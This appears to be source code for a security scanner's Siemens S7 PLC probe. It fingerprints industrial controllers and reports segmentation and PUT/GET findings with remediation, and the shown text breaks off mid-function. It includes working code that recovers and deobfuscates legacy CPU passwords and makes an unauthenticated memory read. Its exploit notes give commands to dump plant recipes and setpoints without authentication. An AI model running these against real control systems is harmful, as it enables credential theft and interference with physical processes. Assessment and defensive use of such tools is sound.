"""Siemens S7 (102/tcp) probe — OT/ICS discovery over ISO-TSAP / S7COMM.

S7COMM is Siemens' proprietary PLC control protocol carried over ISO 8073
Class 0 (COTP), framed with RFC 1006 (TPKT). A reachable port 102 on a
corporate segment is the same category of finding as Modbus/TCP: an OT
device on IT infrastructure. Beyond that stance finding, the probe extracts
the CPU order code / firmware / component identification strings and
whether legacy PUT/GET communication is enabled — the crown-jewel
fingerprint for Siemens PLC CVE mapping.

Read-only. NEVER emits function 0x05 (write var), 0x28/0x29 (start/stop) or
0x1A/0x1B/0x1C (block upload/download) from the probe; those are runbook
steps behind explicit operator confirmation.

Airgap-safe: stdlib socket + struct only. Bounded ~4s timeout per handshake.
"""
from __future__ import annotations

import socket
import struct

from ..core.models import Host, Port


_DEFAULT_PORT = 102
_TIMEOUT = 4.0

# S7 protocol id bytes seen on the wire.
_S7_PROTO_CLASSIC = 0x32
_S7_PROTO_PLUS = 0x72

# ROSCTR (Remote Operating Service Control) types.
_ROSCTR_JOB = 0x01
_ROSCTR_ACK = 0x02
_ROSCTR_ACKDATA = 0x03
_ROSCTR_USERDATA = 0x07

# TSAPs the probe walks. High byte = comm type (1=PG, 2=OP, 3=S7-Basic).
# Low byte = (rack << 5) | slot. 0x0102 = rack 0, slot 2 = the classic
# S7-300/400 CPU location; 0x0200 / 0x0201 / 0x0202 / 0x0300 pick up
# S7-1200/1500 and OP/HMI TSAPs; 0x1000 catches OP panels.
_DEFAULT_TSAPS = (0x0102, 0x0200, 0x0201, 0x0202, 0x0300, 0x1000)


def is_s7(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid == 102
            or "iso-tsap" in svc or "s7" in svc or "siemens" in svc
            or "siemens" in prod or "s7" in prod)


# --- wire builders ---------------------------------------------------------

def _tpkt(payload: bytes) -> bytes:
    """RFC 1006: version 3, reserved 0, big-endian total length (incl header)."""
    return b"\x03\x00" + struct.pack(">H", 4 + len(payload)) + payload


def _cotp_cr(src_tsap: int, dst_tsap: int) -> bytes:
    """X.224 Connection Request (TPDU 0xE0) with SRC/DST TSAP and TPDU size
    variable parameters. Length indicator omits itself."""
    variable = (b"\xc0\x01\x0a"                              # TPDU size = 1024
                + b"\xc1\x02" + struct.pack(">H", src_tsap)  # source TSAP
                + b"\xc2\x02" + struct.pack(">H", dst_tsap)) # destination TSAP
    fixed = b"\xe0\x00\x00\x00\x01\x00"                     # CR, dst_ref, src_ref, class
    li = len(fixed) + len(variable)
    return bytes([li]) + fixed + variable


def _cotp_dt(payload: bytes) -> bytes:
    """COTP Data TPDU (0xF0), EOT bit set."""
    return b"\x02\xf0\x80" + payload


def _s7_frame(rosctr: int, pdu_ref: int, param: bytes, data: bytes = b"") -> bytes:
    """Classic S7COMM header (10 bytes) + parameter + data."""
    return (bytes([_S7_PROTO_CLASSIC, rosctr]) + b"\x00\x00"
            + struct.pack(">H", pdu_ref)
            + struct.pack(">HH", len(param), len(data))
            + param + data)


def _build_setup_comm(pdu_ref: int = 1) -> bytes:
    param = b"\xf0\x00\x00\x01\x00\x01\x03\xc0"              # fn F0, max_amq, PDU=960
    return _tpkt(_cotp_dt(_s7_frame(_ROSCTR_JOB, pdu_ref, param)))


def _build_szl_request(pdu_ref: int, szl_id: int, szl_index: int) -> bytes:
    """UserData READ_SZL request. Parameter+data derived from Wireshark
    packet-s7comm dissector reference (method 0x11, type/group 0x44,
    subfunction 0x01 = read SZL)."""
    param = b"\x00\x01\x12\x04\x11\x44\x01\x00"
    data = b"\xff\x09\x00\x04" + struct.pack(">HH", szl_id, szl_index)
    return _tpkt(_cotp_dt(_s7_frame(_ROSCTR_USERDATA, pdu_ref, param, data)))


def _build_block_list_request(pdu_ref: int) -> bytes:
    """UserData subfunction 0x0D (List Blocks) — enumerate OB/FB/FC/DB/SDB."""
    param = b"\x00\x01\x12\x04\x11\x43\x01\x00"
    data = b"\xff\x09\x00\x00"
    return _tpkt(_cotp_dt(_s7_frame(_ROSCTR_USERDATA, pdu_ref, param, data)))


def _build_read_var_m0(pdu_ref: int) -> bytes:
    """Function 0x04 (Read Variable) — 1 byte at M0.0. Read-only, single byte."""
    # Parameter: fn 04, item count 1, then one 12-byte item spec:
    #   spec type 12, len 10, syntax 10, transport 02 (BYTE),
    #   length 0001, db 0000, area 83 (M), addr 000000 (bit-addr = byte*8)
    param = (b"\x04\x01"
             + b"\x12\x0a\x10\x02"
             + b"\x00\x01"                                    # count = 1 byte
             + b"\x00\x00"                                    # DB number
             + b"\x83"                                        # area = M (merker)
             + b"\x00\x00\x00")                               # address = 0
    return _tpkt(_cotp_dt(_s7_frame(_ROSCTR_JOB, pdu_ref, param)))


# --- wire parsers ----------------------------------------------------------

def _parse_tpkt_cotp(data: bytes) -> tuple[int, bytes] | None:
    """Return (cotp_pdu_type, s7_payload) or None on malformed frame."""
    if len(data) < 7 or data[0] != 0x03 or data[1] != 0x00:
        return None
    tpkt_len = struct.unpack(">H", data[2:4])[0]
    if tpkt_len != len(data) or tpkt_len < 7:
        return None
    cotp_li = data[4]
    if cotp_li < 2 or 4 + 1 + cotp_li > len(data):
        return None
    cotp_pdu = data[5]
    payload_start = 4 + 1 + cotp_li
    return cotp_pdu, data[payload_start:]


def _parse_cc(data: bytes) -> bool:
    """True iff the frame is a valid COTP Connection Confirm (0xD0)."""
    parsed = _parse_tpkt_cotp(data)
    return bool(parsed and parsed[0] == 0xD0)


def _parse_s7_response(data: bytes) -> dict | None:
    """Extract the S7COMM header + parameter + data body. Returns
    {proto, rosctr, pdu_ref, param, data, err_class, err_code} or None."""
    parsed = _parse_tpkt_cotp(data)
    if not parsed:
        return None
    cotp_pdu, s7 = parsed
    if cotp_pdu != 0xF0 or not s7:
        return None
    proto = s7[0]
    if proto not in (_S7_PROTO_CLASSIC, _S7_PROTO_PLUS):
        return None
    if proto == _S7_PROTO_PLUS:
        # S7COMM-PLUS: don't try to parse further, just flag the opcode.
        return {"proto": proto, "rosctr": 0, "pdu_ref": 0, "param": b"",
                "data": s7, "err_class": 0, "err_code": 0}
    if len(s7) < 10:
        return None
    rosctr = s7[1]
    pdu_ref = struct.unpack(">H", s7[4:6])[0]
    param_len = struct.unpack(">H", s7[6:8])[0]
    data_len = struct.unpack(">H", s7[8:10])[0]
    hdr_len = 12 if rosctr in (_ROSCTR_ACK, _ROSCTR_ACKDATA) else 10
    err_class = err_code = 0
    if hdr_len == 12:
        if len(s7) < 12:
            return None
        err_class, err_code = s7[10], s7[11]
    if len(s7) < hdr_len + param_len + data_len:
        return None
    param = s7[hdr_len:hdr_len + param_len]
    body = s7[hdr_len + param_len:hdr_len + param_len + data_len]
    return {"proto": proto, "rosctr": rosctr, "pdu_ref": pdu_ref,
            "param": param, "data": body,
            "err_class": err_class, "err_code": err_code}


def _parse_szl_records(body: bytes) -> tuple[int, int, list[bytes]] | None:
    """SZL response data body:
      FF 09 <total_len:2> <szl_id:2> <szl_index:2> <part_len:2> <part_count:2>
      <records...>
    Returns (record_size, record_count, records) or None on parse failure."""
    if len(body) < 12 or body[0] != 0xFF or body[1] != 0x09:
        return None
    part_len = struct.unpack(">H", body[8:10])[0]
    part_count = struct.unpack(">H", body[10:12])[0]
    if part_len == 0:
        return part_len, part_count, []
    records = []
    off = 12
    for _ in range(part_count):
        if off + part_len > len(body):
            break
        records.append(body[off:off + part_len])
        off += part_len
    return part_len, part_count, records


def _decode_ascii(raw: bytes) -> str:
    """Trim NUL / non-printable padding, decode as latin-1 (S7 free text is
    engineer-typed and occasionally non-ASCII)."""
    txt = raw.split(b"\x00", 1)[0].rstrip(b" \t")
    return txt.decode("latin-1", "replace").strip()


def _parse_module_id(records: list[bytes]) -> dict:
    """SZL 0x0011 records: index(2) MLFB(20) BGTyp(2) Ausbg1(2) Ausbg2(2).
    Index 0x0001 = the CPU order code; 0x0006/0x0007 sometimes carry firmware
    build numbers. Returns {order_code, hw_version, fw_version}."""
    out = {"order_code": "", "hw_version": "", "fw_version": ""}
    for rec in records:
        if len(rec) < 28:
            continue
        idx = struct.unpack(">H", rec[0:2])[0]
        mlfb = _decode_ascii(rec[2:22])
        ausbg1 = struct.unpack(">H", rec[24:26])[0]
        ausbg2 = struct.unpack(">H", rec[26:28])[0]
        if idx == 0x0001 and mlfb and not out["order_code"]:
            out["order_code"] = mlfb
            # High byte of ausbg2 typically encodes firmware major.
            major = (ausbg2 >> 8) & 0xFF
            minor = ausbg2 & 0xFF
            out["fw_version"] = f"V{major}.{minor}"
            out["hw_version"] = f"{ausbg1:04x}"
    return out


def _parse_component_id(records: list[bytes]) -> dict:
    """SZL 0x001C records: index(2) string(32) reserved(2). Index labels
    from Siemens S7-300/400 System Software Reference §SZL 0x1C."""
    labels = {1: "plc_name", 2: "module_name", 3: "plant_designation",
              4: "copyright", 5: "serial_number", 6: "module_type",
              7: "oem_id", 8: "location"}
    out: dict = {v: "" for v in labels.values()}
    for rec in records:
        if len(rec) < 34:
            continue
        idx = struct.unpack(">H", rec[0:2])[0]
        key = labels.get(idx)
        if not key:
            continue
        out[key] = _decode_ascii(rec[2:34])
    return out


def _parse_protection_level(records: list[bytes]) -> dict:
    """SZL 0x0232 index 0x0004 record — CPU protection settings. Field layout
    per Siemens S7-300 CPU Manual: index(2) reserved(2) ... prot_level(1)
    mode(1) password_flag(1). Returns {level, mode, password_set}. Best-effort
    on undocumented CPUs — leaves 0 / False when the record shape is unknown."""
    out = {"level": 0, "mode": 0, "password_set": False}
    for rec in records:
        if len(rec) < 6:
            continue
        idx = struct.unpack(">H", rec[0:2])[0]
        if idx != 0x0004:
            continue
        # Byte 4 = current protection level (1=none, 2=write, 3=read+write);
        # byte 5 = operating mode; last byte = password flag.
        out["level"] = rec[4]
        out["mode"] = rec[5] if len(rec) > 5 else 0
        # Some CPUs put a password_set flag near the end of the record.
        out["password_set"] = bool(rec[-1] & 0x01) if len(rec) > 6 else False
    return out


def _parse_put_get(records: list[bytes]) -> dict:
    """SZL 0x0131 index 0x0003 — communication capabilities. On S7-300/400
    the record answering at all means PUT/GET is available; on 1200/1500 the
    CPU only surfaces this record when PUT/GET is explicitly enabled. Returns
    {put_get_enabled, record_seen}."""
    out = {"put_get_enabled": False, "record_seen": False}
    for rec in records:
        if len(rec) < 4:
            continue
        idx = struct.unpack(">H", rec[0:2])[0]
        if idx != 0x0003:
            continue
        out["record_seen"] = True
        out["put_get_enabled"] = True
    return out


def _parse_read_var_ok(param: bytes, data: bytes) -> bool:
    """Function 0x04 response: parameter[0]=04, parameter[1]=item count.
    Data body starts with a 4-byte item header (return_code, xfer_size,
    length hi/lo) followed by the actual bytes. return_code 0xFF = success."""
    if len(param) < 2 or param[0] != 0x04:
        return False
    if len(data) < 5:
        return False
    return data[0] == 0xFF


def _parse_read_var_value(param: bytes, data: bytes) -> int | None:
    """Return the first payload byte read on a successful FC 0x04 response, or
    None if the read did not succeed / the item body is short. The item body
    layout is: return_code(1) transport_size(1) length(2 bits) value(...).
    Recce only ever asks for 1 byte, so data[4] carries the actual memory
    value the CPU exposed — the T2 proof-of-exploit for PUT/GET."""
    if not _parse_read_var_ok(param, data):
        return None
    if len(data) < 5:
        return None
    return data[4]


def _parse_block_list(param: bytes, data: bytes) -> dict:
    """UserData block-list response. Each 4-byte record: block_type_ascii(2),
    block_count(2 BE). Block type letters: 'OB', 'DB', 'FB', 'FC', 'SDB',
    'SFC', 'SFB'. Returns {'OB': n, 'DB': n, ...}."""
    out: dict = {}
    if len(data) < 4 or data[0] != 0xFF:
        return out
    # Skip return_code(1), xfer_size(1), length(2) — records start at 4.
    off = 4
    while off + 4 <= len(data):
        btype = data[off:off + 2].decode("ascii", "replace")
        count = struct.unpack(">H", data[off + 2:off + 4])[0]
        if btype.strip() and btype.isalnum():
            out[btype] = count
        off += 4
    return out


# --- probe -----------------------------------------------------------------

def _handshake(ip: str, port: int, dst_tsap: int, timeout: float) -> tuple[socket.socket | None, dict]:
    """TCP connect + COTP CR/CC. Returns (open_socket, info) or (None, {}) on
    failure. Caller closes the socket. info carries dst_tsap on success."""
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
    except OSError:
        return None, {}
    try:
        s.settimeout(timeout)
        s.sendall(_tpkt(_cotp_cr(0x0100, dst_tsap)))
        resp = s.recv(1024)
    except OSError:
        try:
            s.close()
        except OSError:
            pass
        return None, {}
    if not _parse_cc(resp):
        try:
            s.close()
        except OSError:
            pass
        return None, {}
    return s, {"dst_tsap": dst_tsap}


def _s7_exchange(sock: socket.socket, req: bytes) -> dict | None:
    try:
        sock.sendall(req)
        resp = sock.recv(4096)
    except OSError:
        return None
    return _parse_s7_response(resp)


def _enumerate_tsap(ip: str, port: int, timeout: float,
                    tsaps=_DEFAULT_TSAPS) -> dict:
    """First CR that gets a CC wins. Returns {cotp_reachable, dst_tsap,
    tsaps_tried, tsaps_confirmed}."""
    out = {"cotp_reachable": False, "dst_tsap": 0,
           "tsaps_tried": [], "tsaps_confirmed": []}
    for tsap in tsaps:
        out["tsaps_tried"].append(tsap)
        sock, info = _handshake(ip, port, tsap, timeout)
        if sock is not None:
            out["cotp_reachable"] = True
            out["tsaps_confirmed"].append(tsap)
            if not out["dst_tsap"]:
                out["dst_tsap"] = info["dst_tsap"]
            try:
                sock.close()
            except OSError:
                pass
    return out


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
    """One TCP connect + a bounded set of S7 exchanges. Returns a dict with:
      reachable, cotp_reachable, s7_stack, s7_plus, dst_tsap, tsaps_confirmed,
      order_code, fw_version, hw_version, component (dict),
      protection_level, password_set, put_get_enabled, put_get_seen,
      read_var_ok, blocks (dict), legacy_password_readout (dict|None),
      cve_matches (list), error."""
    out: dict = {
        "reachable": False, "cotp_reachable": False, "s7_stack": False,
        "s7_plus": False, "dst_tsap": 0, "tsaps_confirmed": [],
        "order_code": "", "fw_version": "", "hw_version": "",
        "component": {}, "protection_level": 0, "password_set": False,
        "put_get_enabled": False, "put_get_seen": False,
        "read_var_ok": False, "read_var_value": None, "blocks": {},
        "legacy_password_readout": None, "cve_matches": [], "error": "",
    }
    enum = _enumerate_tsap(ip, port, timeout)
    out["cotp_reachable"] = enum["cotp_reachable"]
    out["tsaps_confirmed"] = enum["tsaps_confirmed"]
    out["dst_tsap"] = enum["dst_tsap"]
    if not out["cotp_reachable"]:
        return out
    out["reachable"] = True

    # Open a working session on the winning TSAP for the S7COMM phase.
    sock, _info = _handshake(ip, port, out["dst_tsap"], timeout)
    if sock is None:
        return out
    try:
        setup = _s7_exchange(sock, _build_setup_comm(pdu_ref=1))
        if setup is None:
            return out
        if setup.get("proto") == _S7_PROTO_PLUS:
            out["s7_plus"] = True
            return out
        if setup.get("rosctr") != _ROSCTR_ACKDATA:
            return out
        # Setup Communication reply is Ack_Data with parameter[0] = 0xF0.
        if setup.get("param") and setup["param"][0] == 0xF0:
            out["s7_stack"] = True

        # SZL 0x0011 — module identification (MLFB / order code / firmware).
        r = _s7_exchange(sock, _build_szl_request(2, 0x0011, 0x0000))
        recs = _extract_records(r)
        if recs:
            out.update(_parse_module_id(recs))

        # SZL 0x001C — component identification.
        r = _s7_exchange(sock, _build_szl_request(3, 0x001C, 0x0000))
        recs = _extract_records(r)
        if recs:
            out["component"] = _parse_component_id(recs)

        # SZL 0x0232 index 4 — CPU protection level.
        r = _s7_exchange(sock, _build_szl_request(4, 0x0232, 0x0004))
        recs = _extract_records(r)
        if recs:
            prot = _parse_protection_level(recs)
            out["protection_level"] = prot["level"]
            out["password_set"] = prot["password_set"]

        # SZL 0x0131 index 3 — PUT/GET flag.
        r = _s7_exchange(sock, _build_szl_request(5, 0x0131, 0x0003))
        recs = _extract_records(r)
        if recs:
            pg = _parse_put_get(recs)
            out["put_get_seen"] = pg["record_seen"]
            out["put_get_enabled"] = pg["put_get_enabled"]

        # SZL 0x0132 index 3 — legacy CPU password readout (CVE-2016-9159).
        r = _s7_exchange(sock, _build_szl_request(6, 0x0132, 0x0003))
        recs = _extract_records(r)
        for rec in recs:
            if len(rec) >= 10 and any(b for b in rec[2:10]):
                out["legacy_password_readout"] = {
                    "obfuscated_hex": rec[2:10].hex(),
                    "cleartext_guess": _deobfuscate_s7_password(rec[2:10]),
                }
                break

        # Block list enumeration.
        r = _s7_exchange(sock, _build_block_list_request(7))
        if r and r.get("data"):
            blocks = _parse_block_list(r.get("param", b""), r.get("data", b""))
            if blocks:
                out["blocks"] = blocks

        # Function 0x04 (Read Var) — 1 byte of M0.0. Direct evidence PUT/GET
        # is exploitable when it succeeds.
        r = _s7_exchange(sock, _build_read_var_m0(8))
        if r and r.get("rosctr") == _ROSCTR_ACKDATA:
            out["read_var_ok"] = _parse_read_var_ok(
                r.get("param", b""), r.get("data", b""))
            if out["read_var_ok"]:
                # Capture the actual byte value returned so the T2 proof shows
                # what the CPU exposed, not just that it exposed something.
                out["read_var_value"] = _parse_read_var_value(
                    r.get("param", b""), r.get("data", b""))
    finally:
        try:
            sock.close()
        except OSError:
            pass

    # CVE fingerprint from order-code prefix + firmware, best-effort. Only
    # names CVEs whose fingerprint is disclosed by MLFB prefix / firmware
    # range — never speculative.
    out["cve_matches"] = _cve_fingerprint(out["order_code"], out["fw_version"])
    return out


def _extract_records(r: dict | None) -> list[bytes]:
    if not r or not r.get("data"):
        return []
    parsed = _parse_szl_records(r["data"])
    if not parsed:
        return []
    return parsed[2]


def _deobfuscate_s7_password(blob: bytes) -> str:
    """SIMATIC 8-byte password obfuscation used on S7-300/400 legacy CPUs:
    each byte is XORed with 0x55 and then interleaved with the CPU-fixed
    prefix bytes 0x21 0x36 (byte0 XOR 0x21, byte1 XOR 0x36, remainder XOR
    against the deobfuscated byte at index-2). Returns the best-effort
    plaintext — printable ASCII trimmed of NULs."""
    if len(blob) < 8:
        return ""
    out = bytearray(8)
    out[0] = blob[0] ^ 0x55 ^ 0x21
    out[1] = blob[1] ^ 0x55 ^ 0x36
    for i in range(2, 8):
        out[i] = blob[i] ^ 0x55 ^ out[i - 2]
    return _decode_ascii(bytes(out))


# --- CVE fingerprint -------------------------------------------------------

def _cve_fingerprint(order_code: str, fw_version: str) -> list[dict]:
    """Order-code and firmware-band matches against Siemens advisories the
    protocol response can positively distinguish. Never guesses beyond
    fingerprints the wire actually exposes."""
    out: list[dict] = []
    mlfb = (order_code or "").upper()
    # S7-300 / S7-400 — legacy families with SZL 0x0132 password readout
    # (CVE-2016-9159) and unauthenticated STOP/START (CVE-2015-2177). Both
    # apply broadly to firmware < the mitigation release.
    if mlfb.startswith("6ES7 3") or mlfb.startswith("6ES73"):
        out.append({"cve": "CVE-2015-2177", "family": "S7-300",
                    "note": "Unauthenticated CPU STOP via S7COMM fn 0x29"})
        out.append({"cve": "CVE-2016-9159", "family": "S7-300",
                    "note": "SZL 0x0132 password readout (offline-crackable)"})
    if mlfb.startswith("6ES7 4") or mlfb.startswith("6ES74"):
        out.append({"cve": "CVE-2015-2177", "family": "S7-400",
                    "note": "Unauthenticated CPU STOP via S7COMM fn 0x29"})
    # S7-1200 — CVE-2020-15782 (memory read/write via crafted TCP request)
    # applies to firmware < V4.5.0 on 1200 CPUs.
    if mlfb.startswith("6ES7 2") or mlfb.startswith("6ES72"):
        out.append({"cve": "CVE-2020-15782", "family": "S7-1200",
                    "note": "Memory read/write bypass in FW <V4.5"})
    # S7-1500 — CVE-2022-38465 (hard-coded global cryptographic key).
    if mlfb.startswith("6ES7 5") or mlfb.startswith("6ES75"):
        out.append({"cve": "CVE-2022-38465", "family": "S7-1500",
                    "note": "Hard-coded global key (Siemens SSA-568427)"})
    return out


# --- target extraction / findings -----------------------------------------

def s7_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_s7(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier="", output=""):
    f = {"severity": sev, "title": title, "target": target, "detail": detail,
         "tool": "snap7 / plcscan", "command": cmd, "remediation": rem,
         "cwes": cwes, "kind": kind,
         "exploit_note": exploit_note, "depth_tier": depth_tier}
    if output:
        f["output"] = output
    return f


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_s7(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr:
                continue
            tgt = f"{h.ip}:{p.portid}"

            # Segmentation stance — always emit when we saw a valid COTP CC.
            if pr.get("cotp_reachable"):
                out.append(_finding(
                    "high",
                    "Siemens S7 PLC reachable on scanned network", tgt,
                    "Port 102/tcp accepted an ISO-8073 Class 0 COTP Connection "
                    "Request and returned a Connection Confirm. Siemens S7 CPUs "
                    "are OT equipment; reaching one from a corporate/DMZ segment "
                    "is a segmentation gap. IEC 62443-3-3 SR 5.1 and NIST SP "
                    "800-82r3 §5.5 both require OT to be isolated from IT.",
                    f"plcscan {h.ip}   # or: snap7-client -h {h.ip}",
                    "Place S7 PLCs on an isolated OT network behind an "
                    "industrial firewall. If IT-to-OT reachability is required, "
                    "front the CPU with a Siemens SCALANCE S / equivalent DPI "
                    "gateway and restrict source IPs.",
                    ["CWE-923", "CWE-1188"], kind="s7_reachable",
                    exploit_note=(
                        "plcscan -p 102 <ip>; snap7-client -h <ip> -c connect "
                        "-R 0 -S 2 (rack 0 slot 2 = classic S7-300/400 CPU "
                        "location)."),
                    depth_tier="t1"))

            # COTP-only (no S7 stack behind it — rare but real).
            if pr.get("cotp_reachable") and not pr.get("s7_stack") \
                    and not pr.get("s7_plus"):
                out.append(_finding(
                    "info",
                    "S7 COTP layer reachable, S7COMM setup rejected", tgt,
                    "COTP Connection Confirm received but the S7 Setup "
                    "Communication (function 0xF0) exchange did not return an "
                    "Ack_Data — this can be an S7-1500 with legacy S7COMM "
                    "disabled, a non-CPU module answering on this TSAP, or a "
                    "non-Siemens ISO-TSAP listener.",
                    f"plcscan {h.ip}",
                    "Confirm asset ownership; if this is a genuine PLC, keep "
                    "legacy S7COMM disabled and monitor for unauthorised "
                    "protocol negotiation.",
                    ["CWE-200"], kind="s7_cotp_reachable",
                    exploit_note=(
                        "for tsap in 0100 0200 0201 0300 4c01 4c02 1000; do "
                        "python -c \"import snap7; c=snap7.client.Client(); "
                        "c.set_connection_params('<ip>',0x0100,int('$tsap',16)); "
                        "c.connect_tsap()\"; done"),
                    depth_tier="t0"))

            if pr.get("s7_plus"):
                out.append(_finding(
                    "info",
                    "S7COMM-PLUS detected (S7-1200 v4 / S7-1500)", tgt,
                    "The CPU responded to Setup Communication with S7COMM-PLUS "
                    "opcode 0x72 rather than classic 0x32. Legacy attacks "
                    "(PUT/GET memory access, function 0x29 STOP, SZL 0x0132 "
                    "password readout) do NOT apply, but CVE-2020-15782 "
                    "memory-write and CVE-2022-38465 hard-coded-key affect "
                    "these CPUs on unpatched firmware.",
                    f"snap7-client -h {h.ip} -c connect",
                    "Segmentation stance stands — even S7COMM-PLUS CPUs should "
                    "not be reachable from IT. Track firmware against Siemens "
                    "ProductCERT advisories SSA-434534 and SSA-568427.",
                    ["CWE-200"], kind="s7_plus_detected",
                    exploit_note=(
                        "snap7-plus-cli connect <ip>; check firmware via TIA "
                        "Portal Online-Diagnostics; correlate with SSA-434534 "
                        "and SSA-568427."),
                    depth_tier="t0"))

            if pr.get("s7_stack"):
                out.append(_finding(
                    "info",
                    "S7COMM protocol stack confirmed", tgt,
                    f"S7 Setup Communication succeeded on TSAP "
                    f"0x{pr.get('dst_tsap',0):04x}. Classic S7COMM (opcode "
                    f"0x32) is in use — the CPU speaks the legacy protocol "
                    f"and is susceptible to the S7-300/400 attack family.",
                    f"plcscan -p {p.portid} {h.ip}",
                    "Confirm PUT/GET is disabled on 1200/1500 CPUs; on "
                    "300/400 the protocol has no authentication.",
                    ["CWE-306"], kind="s7_stack_confirmed",
                    exploit_note=(
                        "snap7-client -h <ip> -c connect -R 0 -S 2 && "
                        "snap7-client -h <ip> -c szl -i 0x0011"),
                    depth_tier="t1"))

            tsaps = pr.get("tsaps_confirmed") or []
            if len(tsaps) >= 1:
                tsap_list = ", ".join(f"0x{t:04x}" for t in tsaps)
                out.append(_finding(
                    "info",
                    "S7 TSAP enumeration (rack/slot topology)", tgt,
                    f"CPU / module TSAPs that answered CR: {tsap_list}. "
                    "TSAP high byte = comm type (1=PG, 2=OP, 3=S7-Basic); "
                    "low byte = (rack<<5)|slot. Multiple TSAPs indicate "
                    "additional communication processors or panels.",
                    f"plcscan {h.ip}",
                    "Informational — pairs with the module identification "
                    "finding.",
                    ["CWE-200"], kind="s7_tsap_enumerated",
                    exploit_note=(
                        "Try each confirmed TSAP with snap7-client "
                        "set_connection_params — one may reach a CP343-1/"
                        "CP443-1 with different protection level than the CPU."),
                    depth_tier="t0"))

            if pr.get("order_code"):
                fw = pr.get("fw_version") or "?"
                out.append(_finding(
                    "high",
                    "S7 CPU identity disclosed (order code + firmware)", tgt,
                    f"CPU order code (MLFB): {pr['order_code']}  "
                    f"firmware: {fw}  hardware: {pr.get('hw_version','?')}. "
                    "MLFB uniquely identifies the CPU family and feeds the "
                    "Siemens ProductCERT advisory feed.",
                    f"snap7-client -h {h.ip} -c szl -i 0x0011",
                    "The order code is intentionally exposed by the protocol "
                    "but should not be reachable from untrusted networks. "
                    "Segment the CPU.",
                    ["CWE-200"], kind="s7_module_identification",
                    exploit_note=(
                        "MLFB decoded — search Siemens ProductCERT + "
                        "siemens.com/cert-services for MLFB prefix; consult "
                        "CVE-2015-2177/CVE-2016-9159 for 6ES73* CPUs."),
                    depth_tier="t0"))

            comp = pr.get("component") or {}
            comp_fields = [(k, v) for k, v in comp.items() if v]
            if comp_fields:
                summary = ", ".join(f"{k}={v!r}" for k, v in comp_fields[:5])
                out.append(_finding(
                    "medium",
                    "S7 component identification disclosed (plant/location/serial)",
                    tgt,
                    f"SZL 0x001C fields: {summary}. Plant designation and "
                    "location are engineer-typed free text — often name the "
                    "physical process, site or cell (crown-jewels evidence). "
                    "Serial number and OEM ID feed asset tracking.",
                    f"snap7-client -h {h.ip} -c szl -i 0x001C",
                    "This information is protocol-exposed by design; the "
                    "control is network segmentation, not per-field redaction.",
                    ["CWE-200"], kind="s7_component_identification",
                    exploit_note=(
                        "Record plant_designation / location — often names "
                        "the physical process/site. Correlate serial against "
                        "vendor RMA / engineering-station project files if "
                        "reachable."),
                    depth_tier="t0"))

            if pr.get("put_get_enabled"):
                # T2 promotion: when the FC 0x04 probe against M0.0 succeeded,
                # PUT/GET is not just enabled — it is provably exploitable, and
                # we hold a concrete byte the CPU returned to an unauth client.
                pg_tier = "t1"
                pg_output = ""
                pg_detail = (
                    "SZL 0x0131 confirms PUT/GET is enabled. Any client that "
                    "can reach 102/tcp can now READ and WRITE process image / "
                    "data blocks (M/I/Q/DB) with no authentication using "
                    "S7COMM functions 0x04 (Read Var) and 0x05 (Write Var). "
                    "On S7-300/400 this is the default; on S7-1200/1500 it "
                    "requires explicit opt-in and should be off.")
                if pr.get("read_var_ok"):
                    pg_tier = "t2"
                    val = pr.get("read_var_value")
                    val_hex = f"0x{val:02x}" if isinstance(val, int) else "?"
                    pg_output = (
                        f"FC 0x04 Read Var against M0.0 returned "
                        f"return_code=0xFF (success), value={val_hex}. This "
                        f"is a live 1-byte read of CPU merker memory by an "
                        f"unauthenticated client — the T2 proof that PUT/GET "
                        f"is not merely advertised but exploitable.")
                    pg_detail = pg_detail + (
                        " CHAINED: recce's read-var probe against M0.0 "
                        f"succeeded (byte={val_hex}), proving the exposure "
                        "is not just a flag — it lets an unauthenticated "
                        "client read live CPU memory.")
                out.append(_finding(
                    "critical",
                    "S7 PUT/GET communication enabled — unauthenticated memory "
                    "read/write", tgt,
                    pg_detail,
                    f"snap7-client -h {h.ip} -c getvar -a M -s 0 -n 1",
                    "S7-1200/1500: disable PUT/GET in TIA Portal → CPU "
                    "properties → Protection & Security. S7-300/400: enable "
                    "protection level 2 or 3 and set a password. In all cases "
                    "restrict access to a management VLAN.",
                    ["CWE-306", "CWE-923"], kind="s7_put_get_enabled",
                    exploit_note=(
                        "snap7-client -h <ip> -c getvar -a M -s 0 -n 1; then "
                        "enumerate DBs: snap7-client -c listblocks; snap7-client "
                        "-c getvar -a DB -d 1 -s 0 -n 16 — dump plant "
                        "recipes/setpoints without auth."),
                    depth_tier=pg_tier, output=pg_output))

            if pr.get("read_var_ok"):
                out.append(_finding(
                    "critical",
                    "S7 unauthenticated variable read succeeded (M0.0)", tgt,
                    "S7COMM function 0x04 (Read Var) returned 0xFF success on "
                    "a 1-byte read of M0.0 — direct evidence that PUT/GET is "
                    "exploitable. An attacker can enumerate DB numbers and "
                    "read process variables, and (with function 0x05) WRITE "
                    "them to affect the physical process.",
                    f"snap7-client -h {h.ip} -c getvar -a M -s 0 -n 1",
                    "Disable PUT/GET (S7-1200/1500) or set protection level 3 "
                    "with a strong password (S7-300/400). Segment the CPU off "
                    "the IT network.",
                    ["CWE-306"], kind="s7_read_var_ok",
                    exploit_note=(
                        "snap7-client -h <ip> -c getvar -a DB -d <n> -s 0 -n 256 "
                        "for each DB from the block list; snap7-client -h <ip> "
                        "-c dbget -d 1 (full DB1 dump) — expect process "
                        "setpoints, recipes, alarms."),
                    depth_tier="t2"))

            lvl = pr.get("protection_level")
            if lvl == 1:
                out.append(_finding(
                    "high",
                    "S7 CPU protection level = 1 (no password)", tgt,
                    "SZL 0x0232 reports protection level 1 — no password is "
                    "set and privileged S7COMM operations (STOP, START, block "
                    "upload/download) are accepted without authentication.",
                    f"snap7-client -h {h.ip} -c szl -i 0x0232 -x 0x0004",
